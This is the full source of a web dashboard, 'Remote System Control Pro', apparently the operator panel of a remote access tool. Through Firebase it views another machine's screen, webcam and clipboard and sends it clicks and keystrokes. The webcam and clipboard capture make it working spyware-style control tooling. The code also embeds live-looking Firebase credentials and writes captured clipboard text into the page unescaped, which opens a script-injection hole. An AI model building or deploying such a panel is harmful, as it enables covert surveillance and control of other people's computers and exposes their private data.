<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote System Control Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-auth-compat.js"></script>
    <style>
        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: #1e293b; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #475569; border-radius: 10px; }
        .screen-container { cursor: crosshair; position: relative; }
        #virtual-cursor {
            position: absolute;
            width: 12px;
            height: 12px;
            background: rgba(239, 68, 68, 0.8);
            border: 2px solid white;
            border-radius: 50%;
            pointer-events: none;
            display: none;
            transform: translate(-50%, -50%);
            z-index: 50;
            box-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
        }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen font-sans">

    <nav class="border-b border-slate-800 bg-slate-900/50 backdrop-blur-md sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
            <div class="flex items-center gap-3">
                <div class="bg-blue-600 p-2 rounded-lg">
                    <i data-lucide="monitor" class="w-6 h-6 text-white"></i>
                </div>
                <h1 class="text-xl font-bold tracking-tight">Remote <span class="text-blue-500">Admin Pro</span></h1>
            </div>
            <div class="flex items-center gap-4">
                <button id="reset-btn" class="text-xs bg-slate-800 hover:bg-red-900/40 text-slate-300 border border-slate-700 px-3 py-1.5 rounded-lg transition-all">
                    Reset Command
                </button>
                <div id="status-indicator" class="flex items-center gap-2 bg-slate-800 px-3 py-1.5 rounded-full text-sm">
                    <span class="relative flex h-3 w-3">
                        <span id="status-ping" class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                        <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500" id="status-dot"></span>
                    </span>
                    <span id="status-text">Connecting...</span>
                </div>
            </div>
        </div>
    </nav>

    <main class="max-w-7xl mx-auto p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        <div class="lg:col-span-8 space-y-6">
            <div class="bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden shadow-2xl">
                <div class="p-4 border-b border-slate-800 flex justify-between items-center">
                    <span class="text-sm font-medium flex items-center gap-2 text-blue-400">
                        <i data-lucide="mouse-pointer-2" class="w-4 h-4"></i> Interaction Layer Active
                    </span>
                    <span class="text-[10px] uppercase tracking-widest text-slate-500">Live Feed</span>
                </div>
                <div class="relative screen-container" id="screen-click-area">
                    <div id="virtual-cursor"></div>
                    <img id="main-screen" src="" alt="Waiting for agent..." class="w-full h-auto min-h-[400px] bg-black object-contain" />
                    <div id="screen-placeholder" class="absolute inset-0 flex flex-col items-center justify-center bg-slate-900">
                        <i data-lucide="loader-2" class="w-10 h-10 text-slate-700 animate-spin mb-4"></i>
                        <p class="text-slate-500">Awaiting Screen Feed...</p>
                    </div>
                </div>
            </div>

            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 shadow-xl">
                <div class="flex flex-col gap-4">
                    <div class="flex gap-3">
                        <input type="text" id="keyboard-input" 
                            placeholder="Type text here..." 
                            class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500/50 text-sm" />
                        <button id="send-btn" class="bg-blue-600 hover:bg-blue-500 px-6 py-3 rounded-xl font-medium flex items-center gap-2 transition-all active:scale-95">
                            <span>Send</span>
                            <i data-lucide="send" class="w-4 h-4"></i>
                        </button>
                    </div>
                    <div class="flex flex-wrap gap-2">
                        <button id="enter-btn" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-sm flex items-center gap-2 border border-slate-700">
                            <i data-lucide="corner-down-left" class="w-4 h-4"></i> Enter
                        </button>
                        <button id="backspace-btn" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-sm flex items-center gap-2 border border-slate-700">
                            <i data-lucide="delete" class="w-4 h-4"></i> Backspace
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <div class="lg:col-span-4 space-y-6">
            <div class="bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden shadow-xl">
                <div class="p-4 bg-slate-800/50 border-b border-slate-800 flex items-center justify-between">
                    <div class="flex items-center gap-2">
                        <i data-lucide="camera" class="w-4 h-4 text-pink-500"></i>
                        <span class="text-sm font-semibold">Webcam Feed</span>
                    </div>
                    <button id="toggle-cam" class="text-[10px] bg-red-500/20 text-red-400 px-2 py-1 rounded border border-red-500/30">
                        Stop Feed
                    </button>
                </div>
                <div class="aspect-video bg-black flex items-center justify-center relative">
                    <img id="camera-feed" src="" class="w-full h-full object-cover hidden" />
                    <div id="camera-placeholder" class="text-slate-600 text-xs text-center p-4">
                        Camera inactive
                    </div>
                </div>
            </div>

            <div class="bg-slate-900 rounded-2xl border border-slate-800 flex flex-col h-[300px] shadow-xl">
                <div class="p-4 border-b border-slate-800 flex items-center gap-2">
                    <i data-lucide="clipboard" class="w-4 h-4 text-yellow-500"></i>
                    <span class="text-sm font-semibold">Clipboard History</span>
                </div>
                <div class="p-4 flex-1 overflow-y-auto custom-scrollbar space-y-3" id="clipboard-container">
                    <div class="text-slate-500 text-center text-sm mt-10 italic">No history...</div>
                </div>
            </div>
        </div>
    </main>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDYbGLAXKaY9uVyNPDCS-bvxsQvPWiLouk",
            authDomain: "sainfoxiya-com-a7733.firebaseapp.com",
            databaseURL: "https://sainfoxiya-com-a7733-default-rtdb.firebaseio.com",
            projectId: "sainfoxiya-com-a7733",
            storageBucket: "sainfoxiya-com-a7733.firebasestorage.app",
            messagingSenderId: "639762867502",
            appId: "1:639762867502:web:826662477ce123110fc6bf",
            measurementId: "G-0Q3FJ4WYZF"
        };

        const appId = 'sainfoxiya-com-a7733';
        const DOC_ID = 'system_state';

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const auth = firebase.auth();

        const screenImg = document.getElementById('main-screen');
        const cameraImg = document.getElementById('camera-feed');
        const screenPlaceholder = document.getElementById('screen-placeholder');
        const cameraPlaceholder = document.getElementById('camera-placeholder');
        const clipboardContainer = document.getElementById('clipboard-container');
        const statusText = document.getElementById('status-text');
        const statusDot = document.getElementById('status-dot');
        const statusPing = document.getElementById('status-ping');
        const keyboardInput = document.getElementById('keyboard-input');
        const virtualCursor = document.getElementById('virtual-cursor');
        const screenArea = document.getElementById('screen-click-area');

        lucide.createIcons();

        async function init() {
            try {
                await auth.signInAnonymously();
                const docRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('remote_control').doc(DOC_ID);
                
                docRef.onSnapshot((doc) => {
                    if (doc.exists) updateUI(doc.data());
                });

                statusText.innerText = "System Online";
                statusDot.classList.replace('bg-red-500', 'bg-green-500');
                statusPing.classList.replace('bg-red-400', 'bg-green-400');
            } catch (err) {
                statusText.innerText = "Connection Failed";
            }
        }

        function updateUI(data) {
            if (data.screen) {
                screenImg.src = `data:image/jpeg;base64,${data.screen}`;
                screenImg.classList.remove('hidden');
                screenPlaceholder.classList.add('hidden');
            }

            if (data.camera && !data.camera_off) {
                cameraImg.src = `data:image/jpeg;base64,${data.camera}`;
                cameraImg.classList.remove('hidden');
                cameraPlaceholder.classList.add('hidden');
            } else {
                cameraImg.classList.add('hidden');
                cameraPlaceholder.classList.remove('hidden');
            }

            if (data.clipboard) {
                clipboardContainer.innerHTML = `
                    <div class="bg-slate-950 border border-slate-800 p-3 rounded-xl">
                        <p class="text-xs text-yellow-100 font-mono break-all">${data.clipboard}</p>
                        <button onclick="copyToDash('${data.clipboard.replace(/'/g, "\\'")}')" class="text-blue-400 text-[10px] mt-2 font-bold uppercase">Copy</button>
                    </div>
                `;
            }
        }

        async function sendCommand(command) {
            const docRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('remote_control').doc(DOC_ID);
            await docRef.update({ command: command });
        }

        screenArea.addEventListener('click', (e) => {
            const rect = screenImg.getBoundingClientRect();
            if (rect.width === 0) return;
            
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;

            // Update Visual Cursor position
            virtualCursor.style.left = `${(x * 100)}%`;
            virtualCursor.style.top = `${(y * 100)}%`;
            virtualCursor.style.display = 'block';

            sendCommand({ type: 'click', x, y, time: Date.now() });
        });

        document.getElementById('send-btn').addEventListener('click', () => {
            if (keyboardInput.value) {
                sendCommand({ type: 'type', text: keyboardInput.value, time: Date.now() });
                keyboardInput.value = '';
            }
        });

        document.getElementById('enter-btn').addEventListener('click', () => sendCommand({ type: 'key', key: 'enter' }));
        document.getElementById('backspace-btn').addEventListener('click', () => sendCommand({ type: 'key', key: 'backspace' }));
        document.getElementById('reset-btn').addEventListener('click', () => sendCommand(null));
        document.getElementById('toggle-cam').addEventListener('click', () => {
            const docRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('remote_control').doc(DOC_ID);
            docRef.update({ camera_off: true });
        });

        window.copyToDash = (text) => {
            const el = document.createElement('textarea');
            el.value = text;
            document.body.appendChild(el);
            el.select();
            document.execCommand('copy');
            document.body.removeChild(el);
        };

        init();
    </script>
</body>
</html>
